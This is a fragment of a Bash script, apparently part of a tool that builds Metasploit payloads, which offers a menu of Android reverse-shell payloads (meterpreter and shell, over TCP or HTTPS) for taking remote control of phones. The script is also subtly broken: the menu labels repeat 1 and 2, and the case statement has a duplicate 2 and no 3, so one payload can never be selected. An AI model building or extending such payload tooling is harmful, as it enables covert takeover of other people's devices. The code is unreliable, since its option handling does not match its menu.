Android_Meter_RevTcp=android/meterpreter/reverse_tcp
Android_Meter_RevHttps=android/meterpreter/reverse_https
Android_Shell_RevTcp=android/shell/reverse_tcp
Android_Shell_RevHttps=android/shell/reverse_https

PAYLOADVALID=false
until [ "$PAYLOADVALID" == true ]
do
    clear
    echo "[ Payloads ]"
    echo "[i] 1 - Meterpreter Reverse TCP"
    echo "[i] 2 - Meterpreter Reverse HTTPS"
    echo "[i] 1 - Shell Reverse TCP"
    echo "[i] 2 - Shell Reverse HTTPS"
    echo ""
    Input "[i] Select Payload: " 
    PAYLOAD=$UserInput
        case $PAYLOAD in
                    1)
                        PAYLOAD=$Android_Meter_RevTcp
                        PAYLOADVALID=true
                    ;;
                    2)
                        PAYLOAD=$Android_Meter_RevHttps
                        PAYLOADVALID=true
                    ;;
                    2)
                        PAYLOAD=$Android_Shell_RevTcp
                        PAYLOADVALID=true
                    ;;
                    4)
                        PAYLOAD=$Android_Shell_RevHttps
                        PAYLOADVALID=true
                    ;;
                    *)
                        PAYLOADVALID=false
        esac
done
ARCH="-"
